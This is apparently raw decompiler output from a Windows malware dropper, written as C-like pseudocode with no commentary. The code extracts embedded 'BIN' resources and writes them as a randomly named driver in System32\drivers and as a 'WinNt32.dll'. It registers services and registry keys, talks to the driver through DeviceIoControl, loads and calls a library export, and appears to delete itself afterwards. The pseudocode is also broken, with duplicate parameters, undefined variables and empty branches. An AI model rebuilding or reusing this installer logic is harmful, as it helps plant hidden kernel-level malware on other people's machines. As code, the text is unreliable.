__size32 global5 = 0;// 4 bytes
__size32 global23 = 0;// 4 bytes
int global20 = 0xbb40e64e;
__size32 global24 = 0;// 4 bytes
__size32 global25 = 0;// 4 bytes
__size32 global26 = 0;// 4 bytes
__size32 global27 = 0;// 4 bytes
__size32 global28 = 0;// 4 bytes

__size8 proc2(LPSTR param2, __size8 *param2, unsigned short param3);
unsigned char *proc3(HMODULE param1, unsigned short param2, LPCSTR param3, DWORD *param4, __size8 param5);
__size32 proc4();
void _start(__size32 param1, __size32 param2, char param3, unsigned short param4, __size32 param5);
void proc5(char param1, unsigned char param2, __size32 param3);
void proc6(__size32 param1, __size32 param2, __size32 param3, __size32 param4, __size32 param5, __size32 param6);
__size32 proc7(LPCVOID param1, DWORD param2);
void proc8(HANDLE param1);
void proc9(HANDLE param1, char param2, char param3, LPSTR param4, __size32 param5);
void proc10();
void proc11(char param1, HANDLE param2, char param3, unsigned char param4, LPSTR param5, __size32 param6);
void proc12(LPVOID param1);
__size8 proc13(unsigned char *param1, unsigned char param2, __size32 param3);
__size32 proc14(DWORD param1);
__size8 proc15(unsigned char *param1, unsigned char *param2, __size32 param3);
void proc16();

// address: 0x80017e0
__size32 proc1(LPSTR param1) {
    GetEnvironmentVariableA();
    lstrcatA(param1, "\System32\WinNt32.dll");
    return 0x8001104;
}

// address: 0x8001700
__size8 proc2(LPSTR param2, __size8 *param2, unsigned short param3) {
    __size32 edx; 		// r26

    proc16();
    edx =  ((int)(param3) < 0) ? -1 : 0;
    tmpl = edx << 32 | (param3);
    *(__size8*)param2 = (unsigned char) tmpl % 25 + 65;
    proc16();
    edx =  ((int)((unsigned short) param2) < 0) ? -1 : 0;
    tmpl = edx << 32 | ((unsigned short) param2);
    *(__size8*)(param2 + 1) = (unsigned char) tmpl % 25 + 97;
    proc16();
    edx =  ((int)((unsigned short) param2) < 0) ? -1 : 0;
    tmpl = edx << 32 | ((unsigned short) param2);
    *(__size8*)(param2 + 2) = (unsigned char) tmpl % 25 + 97;
    proc16();
    edx =  ((int)((unsigned short) param2) < 0) ? -1 : 0;
    tmpl = edx << 32 | ((unsigned short) param2);
    *(__size8*)(param2 + 3) = (unsigned char) tmpl % 9 + 48;
    proc16();
    edx =  ((int)((unsigned short) param2) < 0) ? -1 : 0;
    tmpl = edx << 32 | ((unsigned short) param2);
    *(__size8*)(param2 + 4) = (unsigned char) tmpl % 9 + 48;
    *(__size8*)(param2 + 5) = 0;
    GetEnvironmentVariableA();
    lstrcatA(param2, "\System32\drivers\");
    lstrcatA(param2, param2);
    lstrcatA(param2, ".sys");
    return (unsigned char) param2; /* WARNING: Also returning: ebp := 0x8001104 */
}

// address: 0x80015a0
unsigned char *proc3(HMODULE param1, unsigned short param2, LPCSTR param3, DWORD *param4, __size8 param5) {
    __size8 dl; 		// r10
    DWORD eax; 		// r24
    unsigned char *eax_1; 		// r24
    HGLOBAL eax_2; 		// r24{52}
    unsigned char *local0; 		// m[esp - 16]
    HRSRC local1; 		// m[esp - 8]
    unsigned int local2; 		// m[esp - 32]
    __size8 local8; 		// param5{128}

    local0 = 0;
    local1 = 0;
    local8 = param5;
    if (param2 == 0) {
        if (param3 != 0) {
            eax = FindResourceA(param1, param3, "BIN");
            local1 = eax;
        }
    } else {
        local2 = (param2);
        eax = FindResourceA(param1, local2, "BIN");
        local1 = eax;
    }
    eax_2 = LoadResource(param1, local1);
    eax = SizeofResource(param1, local1);
    if (eax_2 != 0) {
        eax_1 = LockResource(eax_2);
        if (eax_1 != 0) {
            *(DWORD*)param4 = eax;
            eax_1 = proc14(eax);
            local0 = eax_1;
            dl = proc15(eax_1, eax_1, eax);
            local8 = dl;
        }
        param5 = local8;
        FreeResource();
    }
    return local0; /* WARNING: Also returning: dl := param5 */
}

// address: 0x8001c70
__size32 proc4() {
    __size32 eax; 		// r24

    eax = CreateFileA();
    return eax; /* WARNING: Also returning: ebp := 0x8001278 */
}

// address: 0x8001ca0
void _start(__size32 param1, __size32 param2, char param3, unsigned short param4, __size32 param5) {
    __size8 dl; 		// r10
    __size32 eax; 		// r24
    __size32 ebp; 		// r29
    int ecx; 		// r25
    int edx; 		// r26
    int esp; 		// r28

    GetModuleHandleA();
    GetVersionExA(&148);
    if (param1 != 5 || param2 != 0) {
    } else {
    }
    if (param1 != 5 || param2 != 1) {
    } else {
    }
    if (param1 != 5 || param2 != 2) {
    } else {
    }
    esp = proc1(&param3); /* Warning: also results in ebp */
    *(__size32*)(esp - 4) = ebp - 544;
    *(__size32*)(esp - 8) = ebp - 816;
    dl = proc2(*(esp - 8), *(esp - 4), param4); /* Warning: also results in ebp */
    if ( !( !(*(ebp - 4) != 0 || *(ebp - 548) != 0) && *(ebp - 8) == 0)) {
        *(union { void * x2887; int x2888; }*)(esp - 16) = ebp - 976;
        *(__size32*)(esp - 20) = 0;
        *(__size32*)(esp - 24) = 101;
        edx = *(ebp - 552);
        *(__size32*)(esp - 28) = edx;
        eax = proc3(*(esp - 28), *(esp - 24), *(esp - 20), *(esp - 16), dl); /* Warning: also results in dl */
        *(__size32*)(ebp - 972) = eax;
        *(union { void * x2889; int x2890; }*)(esp - 16) = ebp - 980;
        *(__size32*)(esp - 20) = 0;
        *(__size32*)(esp - 24) = 102;
        ecx = *(ebp - 552);
        *(__size32*)(esp - 28) = ecx;
        eax = proc3(*(esp - 28), *(esp - 24), *(esp - 20), *(esp - 16), dl);
        *(__size32*)(ebp - 988) = eax;
        *(__size32*)(ebp - 984) = 0;
        eax = proc4(); /* Warning: also results in esp, ebp */
        *(__size32*)(ebp - 992) = eax;
        if (*(ebp - 992) == -1) {
            edx = *(ebp - 980);
            *(__size32*)(esp - 4) = edx;
            eax = *(ebp - 988);
            *(__size32*)(esp - 8) = eax;
            *(union { void * x2895; int x2896; }*)(esp - 12) = ebp - 280;
            eax = proc7(*(esp - 8), *(esp - 4));
            if (eax == 1) {
                *(__size32*)(ebp - 984) = 1;
            }
            edx = *(ebp - 976);
            *(__size32*)(esp - 4) = edx;
            eax = *(ebp - 972);
            *(__size32*)(esp - 8) = eax;
            *(union { void * x2897; int x2898; }*)(esp - 12) = ebp - 816;
            proc7(*(esp - 8), *(esp - 4));
            proc8(*(esp - 16));
            *(union { void * x2899; int x2900; }*)(esp - 4) = ebp - 544;
            proc9(*(esp - 536), *(esp - 532), *(esp - 276), *(esp - 4), param5);
        }
        *(__size32*)(esp - 4) = 0;
        *(union { void * x2891; int x2892; }*)(esp - 8) = ebp - 996;
        *(__size32*)(esp - 12) = 0;
        *(__size32*)(esp - 16) = 0;
        eax = *(ebp - 976);
        *(__size32*)(esp - 20) = eax;
        ecx = *(ebp - 972);
        *(__size32*)(esp - 24) = ecx;
        *(__size32*)(esp - 28) = 0x9d082440;
        edx = *(ebp - 992);
        *(__size32*)(esp - 32) = edx;
        DeviceIoControl();
        *(__size32*)(esp - 36) = 0;
        *(union { void * x2893; int x2894; }*)(esp - 40) = ebp - 996;
        *(__size32*)(esp - 44) = 0;
        *(__size32*)(esp - 48) = 0;
        ecx = *(ebp - 980);
        *(__size32*)(esp - 52) = ecx;
        edx = *(ebp - 988);
        *(__size32*)(esp - 56) = edx;
        *(__size32*)(esp - 60) = 0x9d082444;
        eax = *(ebp - 992);
        *(__size32*)(esp - 64) = eax;
        DeviceIoControl();
        ecx = *(ebp - 992);
        *(__size32*)(esp - 68) = ecx;
        CloseHandle(*(esp - 68));
        *(__size32*)(esp - 4) = edx;
        proc12(*(esp + 4));
        *(__size32*)(esp - 4) = eax;
        proc12(*(esp + 4));
        if ( !flags) {
            *(__size32*)(esp - 4) = ecx;
            LoadLibraryA(*(esp + 4));
            *(__size32*)(ebp - 1008) = eax;
            if ( !flags) {
                *(__size32*)(esp - 4) = 0x8001284;
                *(__size32*)(esp - 4) = edx;
                GetProcAddress(*(esp + 4), *(esp + 8));
                *(__size32*)(ebp - 1012) = eax;
                if ( !flags) {
                    (**(ebp - 1012))();
                }
            }
        }
    }
    proc5(*(esp - 636), *(esp - 368), edi);
    proc6();
    return;
}

// address: 0x8001450
void proc5(char param1, unsigned char param2, __size32 param3) {
    __size8 cl; 		// r9
    __size32 eax; 		// r24
    __size32 eax_2; 		// r24{32}
    __size32 ebp; 		// r29
    int edx; 		// r26
    int esp; 		// r28
    void *esp_2; 		// r28{166}
    int local0; 		// m[esp - 296]
    __size32 local10; 		// m[esp - 4]
    unsigned int local5; 		// m[esp - 648]

    local0 = esp - 636;
    cl = proc13(&param2, 0, 64);
    eax_2 = GetCommandLineA();
    esp = lstrcpyA();
    eax = (int) *(esp - 636);
    if (eax == 34) {
        eax = lstrlenA(); /* Warning: also results in esp */
        *(__size8*)(esp + eax - 638) = 0;
        *(int*)(esp - 296) = (esp - 635);
    }
    esp_2 = esp;
    *(__size32*)(esp_2 - 4) = 260;
    *(int*)(esp_2 - 8) = *(esp - 296);
    *(int*)(esp_2 - 12) = *(esp - 296);
    eax = GetShortPathNameA(); /* Warning: also results in edx, esp */
    if (eax != 0) {
        *(__size32*)(esp_2 - 16) = 0x80010dc;
        *(int*)(esp_2 - 20) = (esp - 276);
        lstrcpyA();
        *(int*)(esp_2 - 24) = local0;
        *(int*)(esp_2 - 28) = esp - 276;
        lstrcatA(*(esp_2 - 28), *(esp_2 - 24));
        *(__size32*)(esp_2 - 24) = 0x80010d4;
        *(int*)(esp_2 - 28) = esp - 276;
        lstrcatA(*(esp_2 - 28), *(esp_2 - 24));
        *(__size32*)(esp_2 - 24) = 260;
        *(int*)(esp_2 - 28) = local0;
        *(__size32*)(esp_2 - 32) = 0x80010cc;
        GetEnvironmentVariableA();
        *(int*)(esp_2 - 36) = (esp - 292);
        *(int*)(esp_2 - 40) = esp - 372;
        *(__size32*)(esp_2 - 44) = 0;
        *(__size32*)(esp_2 - 48) = 0;
        *(__size32*)(esp_2 - 52) = 0x8000000;
        *(__size32*)(esp_2 - 56) = 0;
        *(__size32*)(esp_2 - 60) = 0;
        *(__size32*)(esp_2 - 64) = 0;
        *(int*)(esp_2 - 68) = esp - 276;
        *(int*)(esp_2 - 72) = local0;
        eax = CreateProcessA(); /* Warning: also results in edx, esp */
        if (eax != 0) {
            *(__size32*)(esp_2 - 76) = 0;
            ExitProcess(*(esp_2 - 76));
        }
    }
    proc6(pc, local5, esp - 636, eax_2, param1, 68, param2, local0, global20 ^ esp - 4, ebp, cl, 0, global20 ^ esp - 4 ^ esp - 4, edx, esp - 4, param3, LOGICALFLAGS32(global20 ^ esp - 4 ^ esp - 4), LOGICALFLAGS32(global20 ^ esp - 4 ^ esp - 4), LOGICALFLAGS32(global20 ^ esp - 4 ^ esp - 4));
}

// address: 0x8001ff8
void proc6(__size32 param1, __size32 param2, __size32 param3, __size32 param4, __size32 param5, __size32 param6) {
    if (param2 != *0x8003000) {
    }
    global23 = param1;
    global24 = param2;
    global25 = param3;
    global26 = param4;
    global27 = param5;
    global28 = param6;
}

// address: 0x8001670
__size32 proc7(LPCVOID param1, DWORD param2) {
    __size32 eax; 		// r24
    union { LPDWORD x605; __size32 x606; } esp; 		// r28

    if (param1 == 0 || param2 == 0) {
L1:
        eax = 0;
    } else {
        eax = CreateFileA();
        if (eax == -1) {
            goto L1;
        } else {
            WriteFile(eax, param1, param2, (esp + 12), 0);
            CloseHandle(eax);
            eax = 1;
        }
    }
    return eax;
}

// address: 0x8001ba0
void proc8(HANDLE param1) {
    RegCreateKeyA();
    lstrlenA();
    RegSetValueExA();
    lstrlenA();
    RegSetValueExA();
    RegSetValueExA();
    RegSetValueExA();
    RegCloseKey(param1);
    return;
}

// address: 0x80018f0
void proc9(HANDLE param1, char param2, char param3, LPSTR param4, __size32 param5) {
    __size32 eax; 		// r24
    __size32 ebp; 		// r29
    int edx; 		// r26
    int esp; 		// r28

    lstrcpyA();
    lstrcatA(&param2, param4);
    lstrcatA(&param2, ".sys");
    lstrcpyA();
    lstrcatA(&param3, param4);
    lstrcatA(&param3, ".sys");
    RegCreateKeyA();
    RegSetValueA();
    RegCloseKey(param1);
    RegCreateKeyA();
    RegSetValueA();
    eax = RegCloseKey(param1); /* Warning: also results in edx */
    proc6(pc, pc, param1, 0, 1, 0x8001128, 8, 0x80000002, esp - 268, esp - 528, param1, 0, 1, 0x8001128, 8, 0x80000002, esp - 524, esp - 528, esp - 268, 0x8001130, esp - 524, 0x8001164, param1, param2, param3, global20 ^ esp - 4, ebp, param4, eax, global20 ^ esp - 4 ^ esp - 4, edx, esp - 4, param5, LOGICALFLAGS32(global20 ^ esp - 4 ^ esp - 4), LOGICALFLAGS32(global20 ^ esp - 4 ^ esp - 4), LOGICALFLAGS32(global20 ^ esp - 4 ^ esp - 4));
    return;
}

// address: 0x8001820
void proc10() {
    __size32 eax; 		// r24
    void *esp_1; 		// r28{31}
    void *esp_2; 		// r28{68}
    void *esp_3; 		// r28{83}
    void *esp_4; 		// r28{92}
    void *esp_5; 		// r28{120}
    void *esp_6; 		// r28{124}
    void *esp_7; 		// r28{132}
    __size32 local0; 		// m[esp - 8]
    void *local1; 		// esp_5{120}
    void *local2; 		// esp_6{124}
    void *local3; 		// esp_7{132}

    OpenSCManagerA();
    eax = OpenServiceA(); /* Warning: also results in esp_1 */
    local1 = esp_1;
    local0 = eax;
    if (eax == 0) {
        eax = CreateServiceA(); /* Warning: also results in esp_2 */
        local1 = esp_2;
        local0 = eax;
    }
    esp_5 = local1;
    local2 = esp_5;
    if (local0 == 0) {
L6:
        esp_6 = local2;
        eax = GetLastError(); /* Warning: also results in esp_4 */
        local3 = esp_4;
        local3 = esp_4;
        if (eax != 1056) {
        } else {
        }
    } else {
        *(__size32*)(esp_5 - 4) = 0;
        *(__size32*)(esp_5 - 8) = 0;
        *(__size32*)(esp_5 - 12) = local0;
        eax = StartServiceA(); /* Warning: also results in esp_3 */
        local2 = esp_3;
        local3 = esp_3;
        if (eax == 0) {
            goto L6;
        } else {
        }
    }
    esp_7 = local3;
    if (local0 != 0) {
        *(__size32*)(esp_7 - 4) = local0;
        CloseServiceHandle();
    }
    return;
}

// address: 0x8001a00
void proc11(char param1, HANDLE param2, char param3, unsigned char param4, LPSTR param5, __size32 param6) {
    __size8 cl; 		// r9
    __size32 eax; 		// r24
    __size32 eax_1; 		// r24{126}
    __size32 ebp; 		// r29
    int edx; 		// r26
    int esp; 		// r28
    __size32 local41; 		// m[esp + 8]

    lstrcpyA();
    lstrcatA(&param3, param5);
    RegCreateKeyA();
    RegSetValueExA();
    RegSetValueExA();
    lstrcpyA();
    lstrcatA(&param1, param5);
    lstrcatA(&param1, ".sys");
    eax_1 = lstrlenA();
    RegSetValueExA();
    cl = proc13(&param4, 0, 245);
    eax = lstrlenA();
    RegSetValueExA();
    eax = RegCloseKey(param2); /* Warning: also results in edx */
    proc6(pc, pc, param2, 0x8001198, 0, 1, esp - 268, eax + 1, esp - 268, param2, 0x80011ac, 0, 1, esp - 788, eax_1 + 1, esp - 788, esp - 788, 0x80011b8, param2, 0x80011cc, 0, 4, esp - 8, 4, param2, 0x80011d4, 0, 4, esp - 792, 4, 0x80000002, esp - 524, esp - 528, esp - 524, local41, 1, param1, param2, param3, 0x49534353, 0x616c4320, 0x7373, 0, param4, global20 ^ esp - 4, 0, ebp, param5, local41, (unsigned short) global20 ^ esp - 4 ^ esp - 4, cl, (unsigned char) esp - 268, eax, global20 ^ esp - 4 ^ esp - 4, edx, esp - 4, param6, LOGICALFLAGS32(global20 ^ esp - 4 ^ esp - 4), LOGICALFLAGS32(global20 ^ esp - 4 ^ esp - 4), LOGICALFLAGS32(global20 ^ esp - 4 ^ esp - 4));
    return;
}

// address: 0x8001420
void proc12(LPVOID param1) {
    __size32 ecx; 		// r25

    if (*0x8003008 != 0) {
        ecx = *0x8003008;
        HeapFree(ecx, 0, param1);
    }
    return;
}

// address: 0x8001390
__size8 proc13(unsigned char *param1, unsigned char param2, __size32 param3) {
    unsigned char *local0; 		// m[esp + 4]
    __size32 local1; 		// m[esp + 12]
    __size32 local2; 		// m[esp + 12]{45}
    unsigned char *local3; 		// param1{44}
    __size32 local4; 		// local2{45}

    local3 = param1;
    local4 = param3;
    param1 = local3;
    local2 = local4;
    local1 = local2 - 1;
    local4 = local1;
    while (local2 != 0) {
        *(unsigned char*)param1 = param2;
        local0 = param1 + 1;
        local3 = local0;
        param1 = local3;
        local2 = local4;
        local1 = local2 - 1;
        local4 = local1;
    }
    return (unsigned char) local2;
}

// address: 0x80013d0
__size32 proc14(DWORD param1) {
    __size32 eax; 		// r24
    __size32 ecx; 		// r25

    if (*0x8003008 == 0) {
        eax = GetProcessHeap();
        global5 = eax;
    }
    if (*0x8003008 == 0) {
        eax = 0;
    } else {
        ecx = *0x8003008;
        eax = HeapAlloc(ecx, 0, param1);
    }
    return eax;
}

// address: 0x8001340
__size8 proc15(unsigned char *param1, unsigned char *param2, __size32 param3) {
    unsigned char dl; 		// r10
    unsigned char *local0; 		// m[esp + 4]
    unsigned char *local1; 		// m[esp + 8]
    __size32 local2; 		// m[esp + 12]
    __size32 local3; 		// m[esp + 12]{53}
    unsigned char *local4; 		// param1{51}
    unsigned char *local5; 		// param2{52}
    __size32 local6; 		// local3{53}

    local4 = param1;
    local5 = param2;
    local6 = param3;
    param1 = local4;
    param2 = local5;
    local3 = local6;
    local2 = local3 - 1;
    local6 = local2;
    while (local3 != 0) {
        dl = *param2;
        *(unsigned char*)param1 = dl;
        local0 = param1 + 1;
        local1 = param2 + 1;
        local4 = local0;
        local5 = local1;
        param1 = local4;
        param2 = local5;
        local3 = local6;
        local2 = local3 - 1;
        local6 = local2;
    }
    return (unsigned char) local3 - 1;
}

// address: 0x80016e0
void proc16() {
    QueryPerformanceCounter();
    return;
}

